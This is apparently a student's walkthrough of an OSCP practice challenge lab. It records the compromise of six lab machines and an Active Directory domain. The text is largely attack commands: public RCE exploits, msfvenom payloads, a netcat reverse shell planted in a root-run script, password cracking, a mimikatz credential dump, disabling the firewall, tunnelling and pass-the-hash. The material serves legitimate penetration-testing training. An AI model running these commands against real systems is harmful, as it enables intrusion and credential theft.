# Questions 
This is the first of three dedicated OSCP Challenge Labs. It is composed of six OSCP machines. The intention of this Challenge is to provide a mock-exam experience that closely reflects a similar level of difficulty to that of the actual OSCP exam.

The challenge contains three machines that are connected via Active Directory, and three standalone machines that do not have any dependencies or intranet connections. All the standalone machines have a local.txt and a proof.txt, however the Active Directory set only has a proof.txt on the Domain Controller. While the Challenge Labs have no point values, on the exam the standalone machines would be worth 20 points each for a total of 60 points. The Active Directory set is worth 40 points all together, and the entire domain must be compromised to achieve any points for it at all.

All the intended attack vectors for these machines are taught in the PEN-200 Modules, or are leveraged in the PEN-200 Challenge Labs 1-3. However, the specific requirements to trigger the vulnerabilities may differ from the exact scenarios and techniques demonstrated in the course material. You are expected to be able to take the demonstrated exploitation techniques and modify them for the current environment.

Please feel free to complete this challenge at your own pace. While the OSCP exam lasts for 23:45 hours, it is designed so that the machines can be successfully attacked in much less time. While each student is different, we highly recommend that you plan to spend a significant amount of time resting, eating, hydrating, and sleeping during your exam. Thus, we explicitly do not recommend that you attempt to work on this Challenge Lab for 24 hours straight.

We recommend that you begin with a network scan on all the provided IP addresses, and then enumerate each machine based on the results. When you are finished with the Challenge, we suggest that you create a mock-exam report for your own records, according to the advice provided in the Report Writing for Penetration Testers Module.

sudo nmap -T4 -A 192.168.242.141-145
[ip-scanning.md]

# CRYSTAL
# Found there is a .git on the server. Lets download and find what can we find from the server
wget -r -np http://192.168.242.144/.git/

git show
...
diff --git a/configuration/database.php b/configuration/database.php
index 55b1645..8ad08b0 100644
--- a/configuration/database.php
+++ b/configuration/database.php
@@ -2,8 +2,9 @@
 class Database{
     private $host = "localhost";
     private $db_name = "staff";
-    private $username = "stuart@challenge.lab";
-    private $password = "BreakingBad92";
...

git log
# Found there is alot changes, 
git show 80ad...
...
+    private $host = "localhost";
+    private $db_name = "staff";
+    private $username = "dean@challenge.pwk";
+    private $password = "BreakingBad92";
...
# Since we have both two credentials now lets try to access into the server
# Only 1 user manage to access it
ssh stuart@192.168.242.144 
cat local.txt

# In the opt/backup found sitebackup1.zip file
# Lets download to our local use scp
scp sitebackup*.zip kali@192.168.45.165:/home/kali/Desktop/OSCP-A

# For the sitebackup3.zip is encrypted, the rest is broken
# Lets extract the password and brute force it
zip2john sitebackup3.zip > sitebackup3.hash
hashcat --help | grep -i "zip"
  13600 | WinZip      | Archive
# References https://www.reddit.com/r/computerforensics/comments/9rezdi/help_cracking_zip_hash/?rdt=50409
code sitebackup3.hash
code zip.hash
hashcat -m 13600 zip.hash /usr/share/wordlists/rockyou.txt
...
codeblue                                             
Session..........: hashcat
Status...........: Cracked
...

[configuration.php]
	public $dbtype = 'mysql';
	public $host = 'localhost';
	public $user = 'joomla';
	public $password = 'Password@1';
	public $db = 'jooml';
	public $dbprefix = 'o83rl_';
    public $secret = 'Ee24zIK4cDhJHL4H';
	public $mailfrom = 'chloe@challenge.lab';
	public $fromname = 'Challenge Lab';
	public $sendmail = '/usr/sbin/sendmail';

# Receive the DB user joomla and chloe, lets try to su chloe
chloe@oscp:/opt/backup$ sudo -l
User chloe may run the following commands on oscp:
    (ALL : ALL) ALL
# Now we got the root user
root@oscp:~# cat proof.txt

# HERMES
snmpwalk -c public -v1 192.168.242.145 
...
iso.3.6.1.2.1.1.4.0 = STRING: "zachary"
iso.3.6.1.2.1.25.6.3.1.2.12 = STRING: "Mouse Server version 1.7.8.5"
...

# Found the server is actually using Mouse Server version 1.7.8.5
searchsploit mouse
...
WiFi Mouse 1.7.8.5 - Remote Code Execution                                        | windows/remote/49601.py
WiFi Mouse 1.7.8.5 - Remote Code Execution(v2)                                    | windows/remote/50972.py
...
searchsplot -m 50972 

msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.168.45.165 LPORT=8888 -f exe -o met.exe

python3 50972.py 192.168.242.145 192.168.45.165 met.exe
# Lel seem like not working.. Lets change to 49601
python3 -m http.server 80 # on the payload folder 
python2 50972.py 192.168.242.145 192.168.45.165 reverse.exe
# In the end I found out is the http server need to be host...
[*] Command shell session 1 opened (192.168.45.165:8888 -> 192.168.242.145:52032) at 2024-06-02 23:52:01 +0800

C:\Users\offsec\Desktop>type local.txt
# Upload winpeas and run
...
  [?] Windows vulns search powered by Watson(https://github.com/rasta-mouse/Watson)
 [*] OS Version: 2004 (19041)
 [*] Enumerating installed KBs...
 [!] CVE-2020-1013 : VULNERABLE
  [>] https://www.gosecure.net/blog/2020/09/08/wsus-attacks-part-2-cve-2020-1013-a-windows-10-local-privilege-escalation-1-day/     
  C:\Users\offsec\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
  Interesting files and registry 
  Putty Sessions
    RegKey Name: zachary
    RegKey Value: "&('C:\Program Files\PuTTY\plink.exe') -pw 'Th3R@tC@tch3r' zachary@10.51.21.12 'df -h'"
C:\Users\offsec\AppData\Local\Microsoft\Edge\User Data\ZxcvbnData\3.0.0.0\passwords.txt
...
# Now we owned the zachary passwords, lets try rdp
# From other writeups, we can use powershell to query
reg query HKCU\Software\SimonTatham\PuTTY\Sessions

xfreerdp /u:zachary /p:Th3R@tC@tch3r /v:192.168.242.145 /cert-ignore
# Run powershell as Admin
PS C:\Users\Administrator\Desktop> type proof.txt


# AERO
# Found 3003 port is able to connect with nc
nc 192.168.242.143 3003 
help
...
bins;build;build_os;build_time;cluster-name;config-get;config-set;digests;dump-cluster;dump-fabric;dump-hb;dump-hlc;dump-migrates;dump-msgs;dump-rw;dump-si;dump-skew;dump-wb-summary;eviction-reset;feature-key;get-config;get-sl;health-outliers;health-stats;histogram;jem-stats;jobs;latencies;log;log-set;log-message;logs;mcast;mesh;name;namespace;namespaces;node;physical-devices;quiesce;quiesce-undo;racks;recluster;revive;roster;roster-set;service;services;services-alumni;services-alumni-reset;set-config;set-log;sets;show-devices;sindex;sindex-create;sindex-delete;sindex-histogram;statistics;status;tip;tip-clear;truncate;truncate-namespace;truncate-namespace-undo;truncate-undo;version;
...
version
Aerospike Community Edition build 5.1.0.1

searchsploit aerospike 
...
Aerospike Database 5.1.0.3 - OS Command Execution                                 | multiple/remote/49067.py
...
pip install aerospike
python3 49067.py --ahost 192.168.242.143 --pythonshell --lhost=192.168.45.244 --lport=443
[+] aerospike build info: 5.1.0.1
[-] this instance is patched.
# Looks like unable to work with the python scripts..
# Lets try community exploit
https://github.com/b4ny4n/CVE-2020-13151
python3 cve2020-13151.py --ahost 192.168.242.143 --pythonshell --lhost=192.168.45.244 --lport=443
connect to [192.168.45.244] from (UNKNOWN) [192.168.242.143] 34122
whoami
aero
cd /home/aero
cat local.txt
cd /tmp
convert Fully TTY using Python
aero@oscp:/home/aero$ scp kali@192.168.45.244:/home/kali/Desktop/Linux/linpeas.sh /home/aero/linpeas.sh
...
2021-05-10+22:20:09.5231970690 /usr/bin/screen-4.5.0
...
# From linpeas found a screen-4.5.0. This exploit is hard and time consume
https://www.exploit-db.com/exploits/41154
https://www.youtube.com/watch?v=RP4hAC96VxQ
https://www.jdksec.com/hack-the-box/haircut

# Option 2: Put pspy64 found some schedulertask
# It is execute by uid 0 which means is root and we can write
...
/bin/sh /opt/aerospike/bin/asadm --asinfo-mode -e 'STATUS'
...

echo 'rm /tmp/ft;mkfifo /tmp/ft;cat /tmp/ft|/bin/sh -i 2>&1|nc 192.168.45.244 443 >/tmp/ft&' > /opt/aerospike/bin/asadm
# Go to listener
pwd
/root
cat proof.txt

# MS01
# From the port scanning, we know there is a port 81 able to use http access
http://192.168.242.141:81/
dirb http://192.168.242.141:81
...
==> DIRECTORY: http://192.168.242.141:81/db/ 
...
# On the db page there is a apsystem.sql
# We can read it with vscode
...
INSERT INTO `admin` (`id`, `username`, `password`, `firstname`, `lastname`, `photo`, `created_on`) VALUES
(1, 'nurhodelta', '$2y$10$fCOiMky4n5hCJx3cpsG20Od4wHtlkCLKmO6VLobJNRIg9ooHTkgjK', 'Neovic', 'Devierte', 'facebook-profile-image.jpeg', '2018-04-30');
...
hashid -m -j '$2y$10$fCOiMky4n5hCJx3cpsG20Od4wHtlkCLKmO6VLobJNRIg9ooHTkgjK'
...
[+] Blowfish(OpenBSD) [Hashcat Mode: 3200][JtR Format: bcrypt]
[+] Woltlab Burning Board 4.x 
[+] bcrypt [Hashcat Mode: 3200][JtR Format: bcrypt]
...
# Paste it to [nurhodelta.hash]
hashcat -m 3200 nurhodelta.hash /usr/share/wordlists/rockyou.txt 
...
password
...
# Lets try to access to webpage just now, unfortunately failed...
searchsploit Attendance and Payroll System
...
Attendance and Payroll System v1.0 - Remote Code Execution (RCE)                  | php/webapps/50801.py
...
# Lets try then..
# Some error happen, need some modification on the code
...
upload_path = '/admin/employee_edit_photo.php'
shell_path = '/images/shell.php'
...
sudo python3 50801.py http://192.168.242.141:81
RCE > whoami
ms01\mary.williams
RCE > whoami /priv
...
SeImpersonatePrivilege        Impersonate a client after authentication Enabled
...
# Nice we can mimikatz, lets upload the payload
RCE > powershell iwr -uri 'http://192.168.45.244:8088/OSCP-A/met.exe' -Outfile 'met.exe'
RCE > .\met.exe
# Msfconsole successful receive, lets upload GodPotato to privilege escalate and upload mimikatz
PS C:\Users\Mary.Williams\Desktop> .\potato.exe -cmd "cmd /c C:\Users\Mary.Williams\Desktop\shell.exe"
# Cannot work properly sia.. Change another tools
PS C:\Users\Mary.Williams\Desktop> .\print.exe -i -c shell.exe
[*] Command shell session 7 opened (192.168.45.244:8888 -> 192.168.242.141:65447) at 2024-06-03 23:10:40 +0800
C:\Windows\system32>whoami
nt authority\system
# Upload mimikatz
privilege::debug
sekurlsa::logonpasswords
...
         * Username : Mary.Williams
         * Domain   : MS01
         * NTLM     : 9a3121977ee93af56ebd0ef4f527a35e
         * SHA1     : 4b1beca6645e6c3edb991248bcd992ec2a90fbb5
        * Username : celia.almeda
         * Domain   : OSCP
         * NTLM     : e728ecbadfb02f51ce8eed753f3ff3fd
         * SHA1     : 8cb61017910862af238631bf7aaae38df64998cd
         * DPAPI    : f3ad0317c20e905dd62889dd51e7c52f

...
lsadump::secrets
...
Secret  : _SC_wampmysqld64 / service 'wampmysqld64' with username : .\Mary.Williams
cur/text: 69jHwjGN2bPQFvJ
...
PS C:\Windows\Temp> net user celia.almeda /domain
...
domain user
...
PS C:\wamp64\attendance\admin\includes> type conn.php
...
<?php
        $conn = new mysqli('localhost', 'root', 'TreeFlaskDomestic505', 'apsystem');
....
# We have the attendance backend database password
# Meanwhile we found the credentials from 
C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
...
C:\users\support\admintool.exe hghgib6vHT3bVWf cmd
...

# Disable current machine firewall
netsh advfirewall set allprofiles state off
netsh advfirewall firewall add rule name="Open All Ports" dir=in action=allow protocol=TCP localport=0-65535

# Allow RDP
reg add "HKLM\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /t REG_DWORD /v portnumber /d 3389 /f
net localgroup "Remote Desktop Users" Administrator /add

# Change administrator password
net user Administrator Password123!

# Upload Chisel and Tunnelling
./chisel server -p 8899 --reverse --socks5
.\chisel.exe client 192.168.45.244:8899 R:socks
sudo nano /etc/proxychains4.conf
...
socks5 127.0.0.1 1080
...

proxychains -q evil-winrm -i 10.10.202.141 -u administrator -p Password123! 

# MS02
proxychains -q evil-winrm -i 10.10.202.142 -u celia.almeda -H e728ecbadfb02f51ce8eed753f3ff3fd

# Under C: drive found a windows.old and inside can find SYSTEM and SAM file. Download to local and use samdump2 to decrypt. Unfortunately unable to decrypt, lets try with pwdump.py
https://github.com/CiscoCXSecurity/creddump7
...
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:acbb9b77c62fdd8fe5976148a933177a:::
tom_admin:1001:aad3b435b51404eeaad3b435b51404ee:4979d69d4ca66955c075c41cf45f24dc:::
Cheyanne.Adams:1002:aad3b435b51404eeaad3b435b51404ee:b3930e99899cb55b4aefef9a7021ffd0:::
David.Rhys:1003:aad3b435b51404eeaad3b435b51404ee:9ac088de348444c71dba2dca92127c11:::
Mark.Chetty:1004:aad3b435b51404eeaad3b435b51404ee:92903f280e5c5f3cab018bd91b94c771:::
...
# From WEB01 we know that tom_admin is Domain Admin
# lets evil-winrm using tom_admin hash back to DC 
proxychains -q evil-winrm -i 10.10.202.140 -u tom_admin -H 4979d69d4ca66955c075c41cf45f24dc

*Evil-WinRM* PS C:\Users\Administrator\Desktop> type proof.txt

# Thats all for the flag 
